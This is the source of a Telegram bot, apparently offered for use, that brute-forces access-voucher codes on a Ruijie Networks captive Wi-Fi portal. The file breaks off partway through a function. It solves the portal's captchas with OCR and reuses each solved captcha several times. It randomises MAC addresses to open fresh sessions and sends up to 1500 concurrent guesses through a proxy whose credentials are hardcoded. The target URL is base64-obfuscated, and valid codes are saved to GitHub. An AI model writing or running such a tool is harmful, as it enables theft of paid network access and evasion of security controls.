"""
STAR LINK Code Checker  ─  World-Class Edition
================================================
Key optimizations:
 • uvloop  (2× faster event loop on Linux/Railway)
 • ujson   (faster JSON)
 • Global session for voucher POSTs (no per-request session overhead)
 • Captcha pool: 250 solvers × 5-reuse = 1250 effective tokens/cycle
 • 1500 concurrent voucher checks
 • Adaptive pool filler (no fixed sleep gaps)
 • Webhook auto-detect for Railway (no polling timeouts)
 • Graceful SIGTERM shutdown
"""

# ── Fast event loop (Railway = Linux, 2× speedup) ─────────────────────
try:
    import uvloop
    uvloop.install()
    _UV = True
except ImportError:
    _UV = False

# ── Fast JSON ─────────────────────────────────────────────────────────
try:
    import ujson as json
except ImportError:
    import json

import asyncio, aiohttp, base64, cv2, ddddocr, logging, numpy as np
import os, random, re, signal, string, time, uuid
from concurrent.futures import ThreadPoolExecutor
from datetime            import datetime, timedelta, timezone

import telebot
from telebot.async_telebot import AsyncTeleBot
from telebot.types         import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp               import web

# ─────────────────────────────────────────────────────────────────────────
# Logging  ─  concise, no spam
# ─────────────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger(__name__)
# suppress noisy telebot internal logs
logging.getLogger("TeleBot").setLevel(logging.WARNING)

# ─────────────────────────────────────────────────────────────────────────
# Config  ─  Railway Variables tab တွင် ထည့်ပါ
# ─────────────────────────────────────────────────────────────────────────
BOT_TOKEN    = os.environ.get("BOT_TOKEN",    "")
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
REPO_OWNER   = os.environ.get("REPO_OWNER",   "")
REPO_NAME    = os.environ.get("REPO_NAME",    "")

ADMINS = [
    "1626617395",   # Admin 1 Telegram ID
    "",   # Admin 2 Telegram ID
]

_miss = [k for k,v in {"BOT_TOKEN":BOT_TOKEN,"GITHUB_TOKEN":GITHUB_TOKEN,
                        "REPO_OWNER":REPO_OWNER,"REPO_NAME":REPO_NAME}.items() if not v]
if _miss:
    raise SystemExit("❌ Railway Variables မထည့်ရသေး:\n" + "\n".join(f"  • {k}" for k in _miss))

def is_admin(uid): return str(uid) in ADMINS

# Railway webhook
_RD          = (os.environ.get("RAILWAY_PUBLIC_DOMAIN") or
                os.environ.get("RAILWAY_STATIC_URL") or "").strip()
WEBHOOK_PATH = f"/wh{BOT_TOKEN.split(':')[0]}" if _RD else None
WEBHOOK_URL  = f"https://{_RD}{WEBHOOK_PATH}"  if _RD else None

PROXY_LIST   = ["w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060"]
_pidx = 0
def get_proxy():
    global _pidx
    if not PROXY_LIST: return None
    p = PROXY_LIST[_pidx % len(PROXY_LIST)]; _pidx += 1
    return f"http://{p}"

# ─────────────────────────────────────────────────────────────────────────
# Speed constants  ─  tuned for Railway free tier (1 CPU, 512 MB RAM)
# ─────────────────────────────────────────────────────────────────────────
CAPTCHA_SOLVERS     = 250   # background captcha solver workers
MAX_CAPTCHA_REUSE   = 5     # times one solved captcha is reused
CAPTCHA_POOL_MAX    = 2000  # max pool depth
POOL_WARMUP_MIN     = 50    # minimum pool before scan starts
VOUCHER_CONCURRENCY = 1500  # simultaneous voucher POST requests
BATCH_SIZE          = 1500  # codes per gather() batch
OCR_WORKERS         = 48    # OCR thread pool size

# POST URL (base64 encoded)
_POST = base64.b64decode(
    b"aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM="
).decode()

_VHDRS = {
    "authority":    "portal-as.ruijienetworks.com",
    "accept":       "*/*",
    "content-type": "application/json",
    "origin":       "https://portal-as.ruijienetworks.com",
    "user-agent":   "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36",
}

_BALANCE_URLS = [
    "https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{}",
    "https://portal-as.ruijienetworks.com/api/macc/balance/getBalance/{}",
    "https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{}",
]

# ─────────────────────────────────────────────────────────────────────────
# Globals
# ─────────────────────────────────────────────────────────────────────────
SUCCESS_Q    = asyncio.Queue()
bot          = AsyncTeleBot(BOT_TOKEN)
user_data    = {}
scan_tasks   = {}
succ_msgs    = {}
succ_texts   = {}
lim_msgs     = {}
lim_texts    = {}
session      = None          # global aiohttp session (for voucher POSTs)
_connector   = None
_ocr_pool    = None          # ThreadPoolExecutor for OCR
_start_time  = time.monotonic()

# Per-scan state (reset each run)
_cap_pool    = None          # asyncio.Queue — (session_id, auth_code)
_banned      = set()         # rate-limited session IDs
_filler      = None          # background Task
_vsem        = None          # voucher semaphore

MAX_SCANS    = 20
_n_scans     = 0
_scans_lock  = asyncio.Lock()

# Speed stats (for ETA / progress)
_checked_total  = 0
_found_total    = 0
_scan_start_t   = 0.0

# ─────────────────────────────────────────────────────────────────────────
# Web server  ─  health check + webhook receiver
# ─────────────────────────────────────────────────────────────────────────
async def _health(req):
    up = int(time.monotonic() - _start_time)
    h, r = divmod(up, 3600); m = r // 60
    pool = _cap_pool.qsize() if _cap_pool else 0
    return web.Response(text=f"✅ up {h}h{m}m | pool {pool} | scans {_n_scans}")

async def _on_webhook(req):
    try:
        upd = telebot.types.Update.de_json(await req.json())
        asyncio.create_task(bot.process_new_updates([upd]))
    except Exception as e:
        log.warning(f"webhook parse: {e}")
    return web.Response(text="OK")

async def start_web_server():
    app = web.Application()
    app.router.add_get("/", _health)
    if WEBHOOK_PATH:
        app.router.add_post(WEBHOOK_PATH, _on_webhook)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8099))
    await web.TCPSite(runner, "0.0.0.0", port).start()
    log.info(f"web :{port} | webhook={'ON' if WEBHOOK_PATH else 'off'} | uvloop={'ON' if _UV else 'off'}")

# ─────────────────────────────────────────────────────────────────────────
# GitHub helpers
# ─────────────────────────────────────────────────────────────────────────
async def gh_get(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    async with session.get(url, headers={"Authorization": f"token {GITHUB_TOKEN}"}) as r:
        if r.status == 200:
            d = await r.json(content_type=None)
            return json.loads(base64.b64decode(d["content"]).decode()), d["sha"]
    return {}, None

async def gh_put(path, content, sha, msg):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    enc = base64.b64encode(json.dumps(content).encode()).decode()
    async with session.put(url,
                           headers={"Authorization": f"token {GITHUB_TOKEN}",
                                    "Content-Type": "application/json"},
                           json={"message": msg, "content": enc, "sha": sha}) as r:
        return r.status

# ─────────────────────────────────────────────────────────────────────────
# Keyboards
# ─────────────────────────────────────────────────────────────────────────
def kb_main():
    k = InlineKeyboardMarkup(row_width=2)
    k.add(
        InlineKeyboardButton("🔗 Portal URL",           callback_data="portal"),
        InlineKeyboardButton("📋 Success Codes",        callback_data="result"),
        InlineKeyboardButton("🔄 Recheck",              callback_data="recheck"),
        InlineKeyboardButton("🛑 Stop Scan",            callback_data="stop"),
    )
    return k

def kb_voucher():
    k = InlineKeyboardMarkup(row_width=2)
    items = [
        ("🔢 6 digit",       "6"),  ("🔢 7 digit",      "7"),
        ("🔢 8 digit",       "8"),  ("🔢 9 digit",      "9"),
        ("🔤 ascii-lower 6", "ascii-lower"), ("🔤 ascii-lower 9","ascii-lower9"),
        ("🎲 all 6",         "all"),
        ("🔤+🔢 mixed 6",    "mixed"),  ("🔤+🔢 mixed 7",   "mixed7"),
        ("🔤+🔢 mixed 8",    "mixed8"), ("🔤+🔢 mixed 9",   "mixed9"),
    ]
    for label, cd in items:
        k.add(InlineKeyboardButton(label, callback_data=f"scan_{cd}"))
    k.add(InlineKeyboardButton("🔙 Back", callback_data="back"))
    return k

def kb_digit(mode):
    k = InlineKeyboardMarkup(row_width=5)
    k.add(*[InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}") for i in range(10)])
    k.add(InlineKeyboardButton("🎲 Random", callback_data=f"digit_{mode}_rand"),
          InlineKeyboardButton("🔙 Back",   callback_data="back"))
    return k

def kb_go():
    k = InlineKeyboardMarkup(row_width=1)
    k.add(InlineKeyboardButton("🚀 START SCAN", callback_data="start"),
          InlineKeyboardButton("🔙 Back",        callback_data="back"))
    return k

def kb_stop():
    k = InlineKeyboardMarkup(row_width=1)
    k.add(InlineKeyboardButton("🛑 STOP SCAN", callback_data="stop"),
          InlineKeyboardButton("🔙 Back",       callback_data="back"))
    return k

def kb_back():
    k = InlineKeyboardMarkup(row_width=1)
    k.add(InlineKeyboardButton("🔙 Back", callback_data="back"))
    return k

# ─────────────────────────────────────────────────────────────────────────
# Bot commands
# ─────────────────────────────────────────────────────────────────────────
@bot.message_handler(commands=["start"])
async def cmd_start(m):
    user_data.setdefault(m.chat.id, {})
    name = m.from_user.first_name or m.from_user.username or "User"
    await bot.send_message(
        m.chat.id,
        f"✨ *STAR LINK CODE HACK* ✨\n\n"
        f"👤 {name}\n🆔 `{m.chat.id}`\n\n"
        "Menu မှ ရွေးချယ်ပါ ↓",
        reply_markup=kb_main(), parse_mode="Markdown",
    )

@bot.message_handler(commands=["portal"])
async def cmd_portal(m):
    parts = m.text.split(maxsplit=1)
    if len(parts) < 2:
        await bot.reply_to(m, "❗ `/portal <url>`", parse_mode="Markdown"); return
    url = parts[1].strip()
    pm  = await bot.reply_to(m, "⏳ URL စစ်ဆေးနေသည်...")
    if await _check_url(url):
        user_data.setdefault(m.chat.id, {})["session_url"] = url
        await bot.edit_message_text("✅ Portal URL သိမ်းပြီး! VOUCHER ရွေးပါ →",
                                    m.chat.id, pm.message_id, reply_markup=kb_voucher())
    else:
        await bot.edit_message_text("❌ URL မမှန်ပါ — ပြန်စစ်ပါ", m.chat.id, pm.message_id)

@bot.message_handler(commands=["scan"])
async def cmd_scan(m):
    p = m.text.split(maxsplit=1); cid = m.chat.id
    if len(p) < 2:
        await bot.reply_to(m, "ဥပမာ: `/scan mixed7`\n\nVOUCHER ရွေးပါ ↓",
                           parse_mode="Markdown", reply_markup=kb_voucher()); return
    await _launch_scan(cid, p[1].strip(), None, m)

@bot.message_handler(commands=["stop"])
async def cmd_stop(m):
    await _do_stop(m.chat.id)
    await bot.reply_to(m, "🛑 Scan ရပ်ပြီး", reply_markup=kb_main())

@bot.message_handler(commands=["result"])
async def cmd_result(m):
    res, _ = await gh_get("result.json")
    codes  = res.get(str(m.chat.id), [])
    await bot.reply_to(m, "✅ Codes:\n" + "\n".join(codes) if codes else "code မရှိသေးပါ")

@bot.message_handler(commands=["recheck"])
async def cmd_recheck(m):
    await _do_recheck(m)

@bot.message_handler(commands=["status"])
async def cmd_status(m):
    if not is_admin(m.chat.id):
        await bot.reply_to(m, "❌ No Permission"); return
    up = int(time.monotonic() - _start_time); h,r = divmod(up,3600); mn,s = divmod(r,60)
    pool  = _cap_pool.qsize() if _cap_pool else 0
    speed = 0
    if _scan_start_t and _checked_total:
        speed = int(_checked_total / (time.monotonic()-_scan_start_t) * 60)
    await bot.reply_to(m,
        f"📊 *Bot Status*\n\n"
        f"⏱ Uptime     : `{h}h {mn}m {s}s`\n"
        f"🔍 Scans      : `{_n_scans}`\n"
        f"⚡ Speed      : `{speed:,}/min`\n"
        f"🎯 Pool       : `{pool}`\n"
        f"🚫 Banned     : `{len(_banned)}`\n"
        f"💎 Found      : `{_found_total}`\n"
        f"🔁 uvloop     : `{'ON' if _UV else 'off'}`",
        parse_mode="Markdown")

# ─────────────────────────────────────────────────────────────────────────
# Callbacks
# ─────────────────────────────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: True)
async def on_cb(call):
    cid  = call.message.chat.id
    name = call.from_user.first_name or call.from_user.username or "User"
    d    = call.data
    await bot.answer_callback_query(call.id)

    async def edit(txt, kb=None, md=False):
        await bot.edit_message_text(txt, cid, call.message.message_id,
                                    reply_markup=kb,
                                    parse_mode="Markdown" if md else None)

    if d == "back":
        await edit(f"✨ *STAR LINK CODE HACK* ✨\n\n👤 {name}\n🆔 `{cid}`",
                   kb_main(), md=True); return

    if d == "portal":
        await edit("🔗 *Portal URL ထည့်ပါ*\n\n`/portal <url>`", kb_back(), md=True); return

    if d == "result":
        res, _ = await gh_get("result.json")
        codes  = res.get(str(cid), [])
        await edit(("✅ *Codes:*\n" + "\n".join(codes)) if codes else "code မရှိသေးပါ",
                   kb_back(), md=bool(codes)); return

    if d == "recheck":
        if "session_url" not in user_data.get(cid, {}):
            await edit("❗ Portal URL ဦးဆုံးထည့်ပါ: `/portal <url>`", kb_back(), md=True); return
        await edit("🔄 Recheck လုပ်နေသည်...", kb_stop())
        await _do_recheck(call.message); return

    if d == "stop":
        await _do_stop(cid)
        await edit("🛑 Scan ရပ်ပြီး", kb_main()); return

    if d == "start":
        mode = user_data.get(cid, {}).get("sel_mode")
        if not mode:
            await edit("❌ VOUCHER mode ဦးဆုံးရွေးပါ", kb_voucher()); return
        if "session_url" not in user_data.get(cid, {}):
            await edit("❗ Portal URL ဦးဆုံးထည့်ပါ", kb_back()); return
        if cid in scan_tasks and not scan_tasks[cid]["task"].done():
            await edit("Scan ရှိပြီးသား — Stop ဦးနှိပ်ပါ", kb_stop()); return
        async with _scans_lock:
            global _n_scans
            if _n_scans >= MAX_SCANS:
                await edit(f"⚠️ Bot အလုပ်များနေသည် ({_n_scans}/{MAX_SCANS})", kb_back()); return
            _n_scans += 1
        await edit(f"🔍 Mode: `{mode}` | Pool ပြင်ဆင်နေသည်...", kb_stop(), md=True)
        prog = await bot.send_message(cid, "⚡ Initializing captcha pool...")
        await _launch_scan(cid, mode, user_data[cid].get("sel_digit"), call.message, prog)
        return

    if d.startswith("scan_"):
        mode = d[5:]
        user_data.setdefault(cid, {})
        if "session_url" not in user_data[cid]:
            await edit("❗ Portal URL ဦးဆုံးထည့်ပါ: `/portal <url>`", kb_back(), md=True); return
        if mode in ["6","7","8","9"]:
            await edit(f"🔢 {mode} digit — ထိပ်ဂဏန်းရွေးပါ", kb_digit(mode)); return
        user_data[cid]["sel_mode"] = mode
        user_data[cid]["sel_digit"] = None
        await edit(f"✅ Mode: `{mode}` ရွေးပြီး\nSTART ကိုနှိပ်ပါ", kb_go(), md=True); return

    if d.startswith("digit_"):
        _, mode, digit = d.split("_", 2)
        user_data.setdefault(cid, {})
        user_data[cid]["sel_mode"]  = mode
        user_data[cid]["sel_digit"] = None if digit == "rand" else digit
        lbl = "Random" if digit == "rand" else f"{digit} မှ"
        await edit(f"✅ Mode: `{mode}` | {lbl}\nSTART ကိုနှိပ်ပါ", kb_go(), md=True); return

# ─────────────────────────────────────────────────────────────────────────
# URL validation
# ─────────────────────────────────────────────────────────────────────────
async def _check_url(url):
    try:
        async with session.get(url, allow_redirects=True,
                               timeout=aiohttp.ClientTimeout(total=15)) as r:
            body = await r.text()
            for kw in ["sessionId","portal-as.ruijienetworks","maccauth","captcha"]:
                if kw in str(r.url) or kw in body: return True
    except Exception:
        pass
    return False

# ─────────────────────────────────────────────────────────────────────────
# Session / Captcha helpers
# ─────────────────────────────────────────────────────────────────────────
def _rand_mac():
    b = [random.choice([0x02,0x06,0x0A,0x0E])] + [random.randint(0,255) for _ in range(5)]
    return ":".join(f"{x:02x}" for x in b)

def _sub_mac(url, mac):
    return re.sub(r"(?<=mac=)[^&]+", mac, url)

async def _get_sid(sess, url, prev=None):
    try:
        async with sess.get(_sub_mac(url, _rand_mac()), allow_redirects=True,
                            timeout=aiohttp.ClientTimeout(total=10)) as r:
            m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
            return m.group(1) if m else prev
    except Exception:
        return prev

async def _cap_img(sess, sid):
    async with sess.get("https://portal-as.ruijienetworks.com/api/auth/captcha/image",
                        params={"sessionId": sid, "_t": str(time.time())},
                        timeout=aiohttp.ClientTimeout(total=8)) as r:
        return await r.read()

async def _verify(sess, sid, text):
    async with sess.post("https://portal-as.ruijienetworks.com/api/auth/captcha/verify",
                         json={"sessionId": sid, "authCode": text},
                         timeout=aiohttp.ClientTimeout(total=8)) as r:
        d = await r.json(content_type=None)
        return bool(d.get("success"))

# ─────────────────────────────────────────────────────────────────────────
# OCR  ─  improved preprocessing, dedicated thread pool
# ─────────────────────────────────────────────────────────────────────────
_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_fn(raw: bytes):
    arr  = np.frombuffer(raw, np.uint8)
    img  = cv2.imdecode(arr, cv2.IMREAD_COLOR)
    if img is None: return None
    img  = cv2.resize(img, None, fx=2, fy=2, interpolation=cv2.INTER_CUBIC)
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    gray = cv2.fastNlMeansDenoising(gray, h=10)
    gray = cv2.filter2D(gray, -1, np.array([[0,-1,0],[-1,5,-1],[0,-1,0]]))
    _, th = cv2.threshold(cv2.GaussianBlur(gray,(3,3),0), 0, 255,
                          cv2.THRESH_BINARY+cv2.THRESH_OTSU)
    th = cv2.morphologyEx(th, cv2.MORPH_CLOSE,
                          cv2.getStructuringElement(cv2.MORPH_RECT,(2,2)))
    _, bf = cv2.imencode(".png", th)
    return _ocr.classification(bf.tobytes()).upper()

async def _ocr(raw: bytes):
    return await asyncio.get_event_loop().run_in_executor(_ocr_pool, _ocr_fn, raw)

# ─────────────────────────────────────────────────────────────────────────
# Captcha Pool  ─  250 background solvers, 5-reuse per solution
# ─────────────────────────────────────────────────────────────────────────
async def _solve_one(pool, url):
    """Solve one captcha, push MAX_CAPTCHA_REUSE copies into pool."""
    try:
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=aiohttp.ClientTimeout(total=15),
        ) as ts:
            sid = await _get_sid(ts, url)
            if not sid: return
            for _ in range(12):
                try:
                    img  = await _cap_img(ts, sid)
                    text = await _ocr(img)
                    if not text: continue
                    if await _verify(ts, sid, text):
                        added = 0
                        for _ in range(MAX_CAPTCHA_REUSE):
                            try:
                                pool.put_nowait((sid, text))
                                added += 1
                            except asyncio.QueueFull:
                                return
                        return
                except Exception:
                    continue
    except Exception:
        pass

async def _pool_filler(pool, url, scan_id, chat_id):
    """Adaptive filler — keeps pool full continuously."""
    sem = asyncio.Semaphore(CAPTCHA_SOLVERS)

    async def _one():
        async with sem:
            await _solve_one(pool, url)

    while True:
        cur = scan_tasks.get(chat_id)
        if not cur or cur.get("scan_id") != scan_id or cur.get("stop"):
            return
        # Adaptive: fill based on how empty pool is
        sz     = pool.qsize()
        unique = sz // MAX_CAPTCHA_REUSE
        want   = (CAPTCHA_POOL_MAX // MAX_CAPTCHA_REUSE) - unique
        if want > 0:
            n     = min(want, CAPTCHA_SOLVERS)
            tasks = [asyncio.create_task(_one()) for _ in range(n)]
            await asyncio.gather(*tasks, return_exceptions=True)
        else:
            await asyncio.sleep(0.01)

async def _get_token(pool, timeout=10.0):
    """Get a non-banned token from pool."""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        rem = deadline - time.monotonic()
        try:
            sid, code = await asyncio.wait_for(pool.get(), timeout=min(rem, 1.0))
            if sid not in _banned:
                return sid, code
        except asyncio.TimeoutError:
            break
    return None, None

async def _solve_demand(url):
    """On-demand single solve (for recheck)."""
    async with aiohttp.ClientSession(
        connector=_connector, connector_owner=False,
        cookie_jar=aiohttp.CookieJar(), timeout=aiohttp.ClientTimeout(total=20)
    ) as ts:
        sid = await _get_sid(ts, url)
        if not sid: return None, None
        for _ in range(12):
            try:
                img  = await _cap_img(ts, sid)
                text = await _ocr(img)
                if text and await _verify(ts, sid, text):
                    return sid, text
            except Exception: continue
    return None, None

# ─────────────────────────────────────────────────────────────────────────
# Core voucher check  ─  uses GLOBAL session for POST (no session overhead)
# ─────────────────────────────────────────────────────────────────────────
async def check_voucher(url, code, chat_id, scan_id, recheck=False, message=None):
    global _checked_total, _found_total

    if not recheck:
        cur = scan_tasks.get(chat_id)
        if not cur or cur.get("scan_id") != scan_id: return None

    # Get captcha token
    sid, auth = (await _solve_demand(url)) if recheck else (await _get_token(_cap_pool))
    if not sid: return None

    # Single POST using GLOBAL session (fastest path — no new session creation)
    try:
        async with session.post(
            _POST,
            json={"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": auth},
            headers=_VHDRS,
            timeout=aiohttp.ClientTimeout(total=12),
        ) as req:
            resp = await req.text()
    except Exception:
        return None

    if not resp: return None

    if "request limited" in resp:
        _banned.add(sid)
        return None

    if "logonUrl" in resp:
        if recheck: return code
        _found_total += 1
        expire, _ = await _expires(sid)
        entry      = f"🎫 {code}\n   {expire}"
        succ_texts.setdefault(chat_id, []).append(entry)
        disp = user_data.setdefault(chat_id, {}).setdefault("_disp", [])
        disp.append(entry)
        await SUCCESS_Q.put({"chat_id": chat_id, "code": code})
        if message:
            txt = "✅ *Success Codes:*\n\n" + "\n\n".join(disp)
            try:
                if chat_id not in succ_msgs or len(txt) > 4000:
                    sent = await bot.send_message(chat_id, txt, parse_mode="Markdown")
                    succ_msgs[chat_id]             = sent.message_id
                    user_data[chat_id]["_disp"]    = [entry]
                else:
                    await bot.edit_message_text(txt, chat_id, succ_msgs[chat_id],
                                                parse_mode="Markdown")
            except Exception: pass
        return code

    if "STA" in resp:
        lim_texts.setdefault(chat_id, []).append(code)
        if message:
            txt = "⚠️ *Limited:*\n" + "\n".join(lim_texts[chat_id][-20:])
            try:
                if chat_id not in lim_msgs:
                    s = await bot.send_message(chat_id, txt, parse_mode="Markdown")
                    lim_msgs[chat_id] = s.message_id
                else:
                    await bot.edit_message_text(txt, chat_id, lim_msgs[chat_id],
                                                parse_mode="Markdown")
            except Exception: pass

    return None

# ─────────────────────────────────────────────────────────────────────────
# Code generators
# ─────────────────────────────────────────────────────────────────────────
_D = string.digits
_L = string.ascii_lowercase
_M = string.ascii_lowercase + string.digits

def iter_codes(mode, start_digit=None):
    if mode in ["6","7","8","9"]:
        n = int(mode)
        if start_digit is not None:
            s = int(start_digit)*(10**(n-1)); e = (int(start_digit)+1)*(10**(n-1))
            for i in range(s,e): yield str(i).zfill(n)
            return
        if n <= 8:
            codes = [str(i).zfill(n) for i in range(10**n)]
            random.shuffle(codes); yield from codes; return
        while True: yield "".join(random.choices(_D, k=n))
    elif mode == "ascii-lower":
        while True: yield "".join(random.choices(_L, k=6))
    elif mode == "ascii-lower9":
        while True: yield "".join(random.choices(_L, k=9))
    elif mode == "all":
        while True: yield "".join(random.choices(_M, k=6))
    elif mode == "mixed":
        while True: yield "".join(random.choices(_M, k=6))
    elif mode == "mixed7":
        while True: yield "".join(random.choices(_M, k=7))
    elif mode == "mixed8":
        while True: yield "".join(random.choices(_M, k=8))
    elif mode == "mixed9":
        while True: yield "".join(random.choices(_M, k=9))
    else:
        raise ValueError(f"Mode '{mode}' မမှန်ပါ")

def _total(mode):
    if mode in ["6","7","8"]: return 10**int(mode)
    return None

# ─────────────────────────────────────────────────────────────────────────
# Progress
# ─────────────────────────────────────────────────────────────────────────
def _fmt_prog(checked, total, speed, found, pool_sz, banned_n, elapsed):
    bar = ""
    if total:
        pct    = min(100.0, checked/total*100)
        filled = min(20, int(pct/5))
        bar    = f"\n[{'█'*filled}{'░'*(20-filled)}] {pct:.1f}%"
        if speed > 0:
            eta_s = max(0, (total-checked)/speed*60)
            h,r   = divmod(int(eta_s),3600); mn = r//60
            bar  += f"  ETA {h}h{mn}m" if h else f"  ETA {mn}m"
    return (
        f"🔍 *Scanning...*\n\n"
        f"📦 Checked  : `{checked:,}`" + (f"`/{total:,}`" if total else "") +
        bar +
        f"\n⚡ Speed    : `{speed:,.0f}/min`"
        f"\n✅ Found    : `{found}`"
        f"\n🎯 Pool     : `{pool_sz}` ready | `{banned_n}` banned"
        f"\n⏱ Elapsed  : `{int(elapsed//60)}m {int(elapsed%60)}s`"
    )

# ─────────────────────────────────────────────────────────────────────────
# Brute-force runner
# ─────────────────────────────────────────────────────────────────────────
async def run_bruteforce(mode, chat_id, url, scan_id,
                         orig=None, prog=None, start_digit=None):
    global _cap_pool, _banned, _filler, _vsem, _checked_total, _found_total, _scan_start_t

    try:
        codes = iter_codes(mode, start_digit)
    except ValueError as e:
        await bot.send_message(chat_id, str(e)); return

    # Init pool
    _cap_pool = asyncio.Queue(maxsize=CAPTCHA_POOL_MAX)
    _banned   = set()
    _filler   = asyncio.create_task(_pool_filler(_cap_pool, url, scan_id, chat_id))

    # Warm-up
    for _ in range(POOL_WARMUP_MIN * 12):
        if _cap_pool.qsize() >= POOL_WARMUP_MIN: break
        await asyncio.sleep(0.1)

    _vsem          = asyncio.Semaphore(VOUCHER_CONCURRENCY)
    total          = _total(mode)
    _checked_total = 0
    _found_total   = 0
    _scan_start_t  = time.monotonic()
    t_last_prog    = 0.0

    log.info(f"scan start | mode={mode} | pool={_cap_pool.qsize()} | chat={chat_id}")

    try:
        while True:
            cur = scan_tasks.get(chat_id)
            if not cur or cur.get("scan_id") != scan_id: return
            if cur.get("stop"):
                scan_tasks.pop(chat_id, None); return

            batch = []
            for _ in range(BATCH_SIZE):
                try:   batch.append(next(codes))
                except StopIteration: break
            if not batch: break

            async def _chk(c):
                async with _vsem:
                    return await check_voucher(url, c, chat_id, scan_id, message=orig)

            await asyncio.gather(*[_chk(c) for c in batch], return_exceptions=True)
            _checked_total += len(batch)

            now = time.monotonic()
            if now - t_last_prog >= 3.0:   # update every 3 seconds
                t_last_prog = now
                el    = now - _scan_start_t
                speed = _checked_total / el * 60 if el > 0 else 0
                txt   = _fmt_prog(_checked_total, total, speed,
                                  len(succ_texts.get(chat_id,[])),
                                  _cap_pool.qsize(), len(_banned), el)
                try:
                    await bot.edit_message_text(txt, chat_id, prog.message_id,
                                                parse_mode="Markdown")
                except Exception:
                    try:
                        nm = await bot.send_message(chat_id, txt, parse_mode="Markdown")
                        prog.message_id = nm.message_id
                    except Exception: pass

            # Log speed to Railway console every 30s
            if _checked_total % 45000 < BATCH_SIZE:
                el    = time.monotonic() - _scan_start_t
                speed = _checked_total / el * 60 if el > 0 else 0
                log.info(f"speed={speed:,.0f}/min | checked={_checked_total:,} | "
                         f"found={len(succ_texts.get(chat_id,[]))} | "
                         f"pool={_cap_pool.qsize()} | banned={len(_banned)}")

        # Done
        el    = time.monotonic() - _scan_start_t
        speed = _checked_total / el * 60 if el > 0 else 0
        done  = (f"✅ *Scan ပြီးပါပြီ*\n\n"
                 f"📦 `{_checked_total:,}`" + (f"`/{total:,}`" if total else "") +
                 f"\n✅ Found : `{len(succ_texts.get(chat_id,[]))}`"
                 f"\n⚡ Avg   : `{speed:,.0f}/min`")
        try:
            await bot.edit_message_text(done, chat_id, prog.message_id, parse_mode="Markdown")
        except Exception:
            await bot.send_message(chat_id, done, parse_mode="Markdown")

    except asyncio.CancelledError:
        pass
    except Exception as e:
        log.error(f"run_bruteforce error: {e}")
    finally:
        if _filler and not _filler.done():
            _filler.cancel()
            try: await _filler
            except asyncio.CancelledError: pass
        _cap_pool = None
        await _send_file(chat_id)
        scan_tasks.pop(chat_id, None)
        succ_msgs.pop(chat_id, None); succ_texts.pop(chat_id, None)
        lim_msgs.pop(chat_id, None);  lim_texts.pop(chat_id, None)
        async with _scans_lock:
            global _n_scans
            _n_scans = max(0, _n_scans - 1)
        log.info(f"scan done | chat={chat_id} | found={_found_total}")

# ─────────────────────────────────────────────────────────────────────────
# Launch / stop helpers
# ─────────────────────────────────────────────────────────────────────────
async def _launch_scan(chat_id, mode, start_digit, orig_msg, prog_msg=None):
    if prog_msg is None:
        prog_msg = await bot.send_message(chat_id, "⚡ Initializing...")
    sid  = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(mode, chat_id, user_data[chat_id]["session_url"],
                       sid, orig_msg, prog_msg, start_digit)
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": sid}

async def _do_stop(chat_id):
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["task"].cancel()
    await _send_file(chat_id)
    for d in (succ_msgs, succ_texts, lim_msgs, lim_texts):
        d.pop(chat_id, None)

async def _do_recheck(msg):
    cid = msg.chat.id
    if "session_url" not in user_data.get(cid, {}):
        await bot.reply_to(msg, "❗ Portal URL ဦးဆုံးထည့်ပါ"); return
    res, sha = await gh_get("result.json")
    codes    = res.get(str(cid), [])
    if not codes:
        await bot.reply_to(msg, "code မရှိသေးပါ"); return
    pm = await bot.reply_to(msg, f"🔍 {len(codes)} codes စစ်ဆေးနေသည်...")
    valid = []
    for c in codes:
        r = await check_voucher(user_data[cid]["session_url"], c, cid,
                                scan_id=None, recheck=True, message=msg)
        if r: valid.append(r)
    res[str(cid)] = valid
    await gh_put("result.json", res, sha, f"recheck {cid}")
    txt = ("✅ Valid:\n"+"\n".join(valid)) if valid else "valid code မကျန်ပါ"
    await bot.edit_message_text(txt, cid, pm.message_id)

# ─────────────────────────────────────────────────────────────────────────
# Balance / expiry
# ─────────────────────────────────────────────────────────────────────────
def _mins_fmt(v):
    try:
        m = int(v)
        if m < 60:  return f"{m}m"
        h,r = divmod(m,60)
        if h < 24:  return f"{h}h{r}m" if r else f"{h}h"
        d,rh = divmod(h,24)
        return f"{d}d{rh}h" if rh else f"{d}d"
    except Exception: return "?"

async def _expires(sid):
    hdrs = {"accept":"application/json",
            "user-agent":"Mozilla/5.0","x-requested-with":"XMLHttpRequest"}
    async with aiohttp.ClientSession(
        connector=_connector, connector_owner=False,
        cookie_jar=aiohttp.CookieJar(), timeout=aiohttp.ClientTimeout(total=8)
    ) as fs:
        for url_tpl in _BALANCE_URLS:
            try:
                async with fs.get(url_tpl.format(sid), headers=hdrs) as r:
